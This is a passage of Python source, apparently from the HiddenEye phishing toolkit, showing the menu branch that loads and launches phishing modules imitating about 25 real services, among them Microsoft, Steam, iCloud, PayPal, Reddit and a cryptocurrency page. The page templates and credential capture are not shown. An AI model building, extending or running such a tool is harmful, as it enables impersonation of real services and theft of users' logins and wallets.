            EssentialsManager.loadModule('Yahoo')
            customOption = ''
            ActionsManager.runPhishing(
                'Yahoo', customOption, EssentialsManager.endMessage)
        elif option == '11':
            EssentialsManager.loadModule('Twitch')
            customOption = ''
            ActionsManager.runPhishing(
                'Twitch', customOption, EssentialsManager.endMessage)
        elif option == '12':
            EssentialsManager.loadModule('Microsoft')
            customOption = ''
            ActionsManager.runPhishing(
                'Microsoft', customOption, EssentialsManager.endMessage)
        elif option == '13':
            EssentialsManager.loadModule('Steam')
            customOption = ''
            ActionsManager.runPhishing(
                'Steam', customOption, EssentialsManager.endMessage)
        elif option == '14':
            EssentialsManager.loadModule('VK')
            customOption = input(
                "\nOperation mode:\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
            ActionsManager.runPhishing(
                'VK', customOption, EssentialsManager.endMessage)
        elif option == '15':
            EssentialsManager.loadModule('iCloud')
            customOption = ''
            ActionsManager.runPhishing(
                'iCloud', customOption, EssentialsManager.endMessage)
        elif option == '16':
            EssentialsManager.loadModule('GitLab')
            customOption = ''
            ActionsManager.runPhishing(
                'GitLab', customOption, EssentialsManager.endMessage)
        elif option == '17':
            EssentialsManager.loadModule('NetFlix')
            customOption = ''
            ActionsManager.runPhishing(
                'NetFlix', customOption, EssentialsManager.endMessage)
        elif option == '18':
            EssentialsManager.loadModule('Origin')
            customOption = ''
            ActionsManager.runPhishing(
                'Origin', customOption, EssentialsManager.endMessage)
        elif option == '19':
            EssentialsManager.loadModule('Pinterest')
            customOption = ''
            ActionsManager.runPhishing(
                'Pinterest', customOption, EssentialsManager.endMessage)
        elif option == '20':
            EssentialsManager.loadModule('ProtonMail')
            customOption = ''
            ActionsManager.runPhishing(
                'ProtonMail', customOption, EssentialsManager.endMessage)
        elif option == '21':
            EssentialsManager.loadModule('Spotify')
            customOption = ''
            ActionsManager.runPhishing(
                'Spotify', customOption, EssentialsManager.endMessage)
        elif option == '22':
            EssentialsManager.loadModule('Quora')
            customOption = ''
            ActionsManager.runPhishing(
                'Quora', customOption, EssentialsManager.endMessage)
        elif option == '23':
            EssentialsManager.loadModule('PornHub')
            customOption = ''
            ActionsManager.runPhishing(
                'PornHub', customOption, EssentialsManager.endMessage)
        elif option == '24':
            EssentialsManager.loadModule('Adobe')
            customOption = ''
            ActionsManager.runPhishing(
                'Adobe', customOption, EssentialsManager.endMessage)
        elif option == '25':
            EssentialsManager.loadModule('Badoo')
            customOption = ''
            ActionsManager.runPhishing(
                'Badoo', customOption, EssentialsManager.endMessage)
        elif option == '26':
            EssentialsManager.loadModule('CryptoCurrency')
            customOption = ''
            ActionsManager.runPhishing(
                'CryptoCurrency', customOption, EssentialsManager.endMessage)
        elif option == '27':
            EssentialsManager.loadModule('DevianArt')
            customOption = ''
            ActionsManager.runPhishing(
                'DevianArt', customOption, EssentialsManager.endMessage)
        elif option == '28':
            EssentialsManager.loadModule('DropBox')
            customOption = ''
            ActionsManager.runPhishing(
                'DropBox', customOption, EssentialsManager.endMessage)
        elif option == '29':
            EssentialsManager.loadModule('eBay')
            customOption = ''
            ActionsManager.runPhishing(
                'eBay', customOption, EssentialsManager.endMessage)
        elif option == '30':
            EssentialsManager.loadModule('MySpace')
            customOption = ''
            ActionsManager.runPhishing(
                'Myspace', customOption, EssentialsManager.endMessage)
        elif option == '31':
            EssentialsManager.loadModule('PayPal')
            customOption = ''
            ActionsManager.runPhishing(
                'PayPal', customOption, EssentialsManager.endMessage)
        elif option == '32':
            EssentialsManager.loadModule('Shopify')
            customOption = ''
            ActionsManager.runPhishing(
                'Shopify', customOption, EssentialsManager.endMessage)
        elif option == '33':
            EssentialsManager.loadModule('Verizon')
            customOption = ''
            ActionsManager.runPhishing(
                'Verizon', customOption, EssentialsManager.endMessage)
        elif option == '34':
            EssentialsManager.loadModule('Yandex')
            customOption = ''
            ActionsManager.runPhishing(
                'Yandex', customOption, EssentialsManager.endMessage)
        elif option == '35':
            EssentialsManager.loadModule('Reddit')
            customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}HiddenEye >>> {2}".format(
                MAIN0, MAIN2, MAIN2))
            ActionsManager.runPhishing(
                'Reddit', customOption, EssentialsManager.endMessage)

        else:
            endMessage()
